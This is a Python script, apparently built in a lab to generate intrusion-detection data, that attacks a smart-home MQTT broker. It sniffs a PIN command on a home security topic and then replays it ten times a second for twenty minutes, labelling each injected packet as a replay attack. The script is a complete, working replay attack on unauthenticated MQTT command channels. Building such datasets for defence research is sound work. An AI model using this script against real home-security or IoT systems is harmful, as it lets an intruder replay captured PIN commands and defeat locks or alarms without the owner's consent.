import paho.mqtt.client as mqtt
import time
import json

BROKER_IP = "192.168.21.64"
CMD_TOPIC = "shtsp/home/security/cmd"

ATTACK_LEVEL = 3

# For 10,000 rows, keep replay running long enough
REPLAY_DURATION_SECONDS = 1200   # 20 minutes
REPLAY_DELAY = 0.1               # 10 packets per second

captured_payload = None
original_capture_time_ms = None


def on_message(client, userdata, msg):
    global captured_payload, original_capture_time_ms

    print("MESSAGE RECEIVED")
    print("Topic:", msg.topic)
    print("Payload:", msg.payload.decode())

    captured_payload = msg.payload.decode()
    original_capture_time_ms = int(time.time() * 1000)

    print(f"\n🕵️ SNIFFER: Captured legitimate command -> {captured_payload}")
    print("Stopping sniffer... Target payload saved in memory.")
    client.disconnect()


print("📡 Phase 1: Sniffing network for a PIN command...")
print("ACTION REQUIRED: Go to MQTT Explorer and send the PIN now!")

sniff_client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, "Hacker_Sniffer")
sniff_client.on_message = on_message
sniff_client.connect(BROKER_IP, 1883)
sniff_client.subscribe(CMD_TOPIC)
print("Subscribed to:", CMD_TOPIC)
sniff_client.loop_forever()

print("\n⏱️ Waiting 15 seconds before replay attack...")
time.sleep(15)

if captured_payload:
    print("🔥 Starting long replay attack for dataset collection...")

    replay_client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, "Hacker_Replay_Device")
    replay_client.connect(BROKER_IP, 1883)

    start_time = time.time()
    packet_count = 0

    while time.time() - start_time < REPLAY_DURATION_SECONDS:
        try:
            replay_payload = json.loads(captured_payload)

            replay_payload["replay_attack"] = 1
            replay_payload["attack_level"] = ATTACK_LEVEL
            replay_payload["original_msg_timestamp_ms"] = original_capture_time_ms
            replay_payload["replay_msg_timestamp_ms"] = int(time.time() * 1000)

            final_payload = json.dumps(replay_payload)

        except Exception:
            final_payload = captured_payload

        replay_client.publish(CMD_TOPIC, final_payload)
        packet_count += 1

        if packet_count % 100 == 0:
            print(f"Injected replayed packets: {packet_count}")

        time.sleep(REPLAY_DELAY)

    replay_client.disconnect()
    print(f"\n✅ Replay Attack Finished. Total packets sent: {packet_count}")

else:
    print("❌ No payload captured. Replay attack could not run.")